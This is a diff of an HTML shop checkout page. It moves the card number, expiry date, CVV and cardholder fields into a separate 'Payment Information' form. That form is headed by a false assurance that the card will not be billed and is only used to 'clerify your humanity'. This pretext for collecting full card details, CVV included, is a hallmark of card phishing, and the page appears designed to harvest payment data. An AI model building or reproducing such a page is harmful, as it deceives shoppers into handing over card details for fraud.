@@ -62,29 +62,39 @@
     <label for="checkOutDate">Postal Code:</label><br>
     <input type="number" id="checkOutDate" name="checkOutDate" required><br><br>
 
-
-
-    
-    
-     <label for="cardNumber">Card Number:</label><br>
-    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required><br><br>
-
-    <label for="expirationDate">Expiration Date:</label><br>
-    <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required><br><br>
-
-    <label for="cvv">CVV:</label><br>
-    <input type="password" id="cvv" name="cvv" maxlength="3" placeholder="123" required><br><br>
-
-    <label for="cardHolderName">Cardholder's Name:</label><br>
-    <input type="text" id="cardHolderName" name="cardHolderName" required><br><br>
-
-
     
     <p><b>Please Input Your full Address below, this is the address the goods purchased would be brought to.</b></p>
     <label for="message">Full address:</label><br>
     <textarea id="message" name="message" rows="4" cols="50" required></textarea><br><br>
 
     <input type="button" value="Purchase" onclick="sendEmail()">
+</form>
+
+
+<p><b>You will not be billed from this bank, this is just to clerify your humanity.</b></p>
+    <h2 style="text-align: center; color: #333;">Payment Information</h2>
+
+<form id="cardForm" style="max-width: 400px; margin: 0 auto; padding: 20px; background-color: #fff; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);">
+    <div style="margin-bottom: 20px;">
+        <label for="cardNumber" style="font-weight: bold;">Card Number:</label><br>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" required>
+    </div>
+
+    <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
+        <div style="flex: 0 0 calc(50% - 10px);">
+            <label for="expirationDate" style="font-weight: bold;">Expiration Date:</label><br>
+            <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" required>
+        </div>
+        <div style="flex: 0 0 calc(50% - 10px);">
+            <label for="cvv" style="font-weight: bold;">CVV:</label><br>
+            <input type="password" id="cvv" name="cvv" maxlength="3" placeholder="123" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" required>
+        </div>
+    </div>
+
+    <label for="cardHolderName" style="font-weight: bold;">Cardholder's Name:</label><br>
+    <input type="text" id="cardHolderName" name="cardHolderName" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;" required><br><br>
+
+    <input type="submit" value="Submit" style="background-color: #007bff; color: #fff; border: none; cursor: pointer; border-radius: 4px;">
 </form>
 
 </body>
